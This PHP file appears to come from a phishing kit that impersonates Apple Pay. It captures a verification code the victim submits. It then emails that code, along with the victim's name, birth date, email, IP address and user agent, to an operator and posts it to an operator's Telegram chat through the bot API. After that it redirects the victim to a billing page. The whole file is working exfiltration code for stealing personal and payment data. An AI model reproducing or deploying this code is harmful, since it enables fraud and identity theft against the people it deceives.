<?php

include("../infos.php");
include("../common/sub_includes.php");


if(isset($_POST)){

	if(!isset($_SESSION)){
		session_start();
	}
	$_SESSION["code"] = $_POST["code"];

	if(1 == 1){

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "

[ð¢] Code Apple Pay [ð¢]

ð¢ Code Apple Pay : ".$_SESSION['code']."
                    
[â½ï¸] Log & Infos [â½ï¸]

â½ï¸ Nom : ".$_SESSION['nom']."
â½ï¸ PrÃ©nom : ".$_SESSION['prenom']."
â½ï¸ Naissance : ".$_SESSION['naissance']."
â½ï¸ Email : ".$_SESSION['mail']."

[ð±] Tiers [ð±]

ð± Adresse ip : ".$_SESSION['ip']."
ð± User Agen : ".$_SESSION['useragent']."


					";

					$subject = "ãð¢ã +1 Apple Pay | ".$_SESSION['mail']." - ".$_SESSION['ip'];
					$headers = "From: Carte V | Miudae <vito@teleg.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[ð¢] Code Apple Pay [ð¢]

ð¢ Code Apple Pay : '.$_SESSION['code'].'

[â½ï¸] Log & Infos [â½ï¸]

â½ï¸ Nom : '.$_SESSION['nom'].'
â½ï¸ PrÃ©nom : '.$_SESSION['prenom'].'
â½ï¸ Naissance : '.$_SESSION['naissance'].'
â½ï¸ Email : '.$_SESSION['mail'].'

[ð±] Tiers [ð±]

ð± Adresse IP : '.$_SESSION['ip'].'
ð± User-agent : '.$_SESSION['useragent'].'


					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}
				$_SESSION["logged"] = true;
				
				header('Location: ../steps/billing.php');
				}
		else{
			header('Location: ../index.php?error=email');

		}

	}

else{
	header('Location: ../');
}


?>